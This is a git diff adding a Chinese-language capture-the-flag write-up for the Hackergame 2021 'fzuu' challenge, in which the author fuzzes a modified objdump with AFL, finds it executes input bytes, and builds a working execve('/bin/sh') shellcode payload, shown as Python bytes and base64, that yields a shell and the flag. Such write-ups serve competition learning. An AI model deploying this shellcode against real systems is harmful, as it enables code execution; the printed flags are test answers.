@@ -4,7 +4,7 @@
 
 公式在 GitHub 大概率无法显示，建议移步博客阅读。
 
-代码文件见 []
+代码文件见 [scripts](https://github.com/USTC-Hackergame/hackergame2021-writeups/tree/master/players/GZTime/scripts)
 
 ## 签到
 
@@ -1689,6 +1689,70 @@ while count > 0:
 最后将其结果转换为所需求的格式，上传即可。
 
 **flag{ju5t_b3_fun_00aacf491c}**
+
+## fzuu
+
+进入注三所指向的网址，可以看到什么是 AFL：american fuzzy lop，简单来说就是通过编译时插桩、分支检测等方式寻找程序的漏洞，对于这道题，我们用其所给的跑一下。
+
+最开始用的参数有问题，fuzz 了好几个小时都没有能用的 payload，最后才发现我把 `-d` 写成了 `-a`……
+```bash
+$ afl-fuzz -i fuzz_in/ -o found ./objdump_afl -d @@
+```
+
+私以为这个界面真帅：
+
+![](https://cdn.gztime.cc/hg2021/fuzz.jpg)
+
+再一段时间的运行之后，我们发现了这样一个 payload:
+```bash
+$ ./objdump -d ./found/fuzzer5/crashes/id\:000000\,sig\:04\,src\:000063+000073\,op\:splice\,rep\:2
+Illegal instruction
+
+$ xxd ./found/fuzzer5/crashes/id\:000000\,sig\:04\,src\:000063+000073\,op\:splice\,rep\:2
+00000000: 5331 3030 3030 30ff ffff ffff 7fff ff7b  S100000........{
+```
+
+于是使用 gdb 调试，看看发生了什么，在崩溃处：
+```bash
+ RIP  0x7fffffffced2 ◂— 0x7bffff7fffffffff
+───────────────────[ DISASM ]───────────────────
+Invalid instructions at 0x7fffffffced2
+```
+
+于是意识到，程序将我们的输入从第八字节开始直接执行了，于是直接从[shell-strom](http://shell-storm.org/shellcode/)上找个`shellcode`，拼接后执行：
+
+```py
+from base64 import b64encode
+code = b'S100000\xff1\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05'
+open('exp.1.bin','wb').write(code)
+print(b64encode(code))
+```
+
+测试执行：
+```bash
+┌──(user㉿GZTime-LAPTOP)-[/mnt/…/CTF/hackergame2021/fzuu]
+└─$ ./objdump -d exp.1.bin
+$ ls
+exp.1.bin  exp.bin objdump  objdump.i64  objdump_afl
+```
+
+直接获取 `shell`，于是上传：
+```bash
+Input your payload in base64: UzEwMDAwMP8xwEi70Z2WkdCMl/9I99tTVF+ZUldUXrA7DwU=
+ls
+bin
+flag.txt
+lib
+lib32
+lib64
+libx32
+main.sh
+objdump
+cat flag.txt
+flag{FuZzlng_Ls_uSeFuI_IN_Testing_e444e963fe}
+```
+
+**flag{FuZzlng_Ls_uSeFuI_IN_Testing_e444e963fe}**
 
 ## 超 OI 的 Writeup 模拟器
 
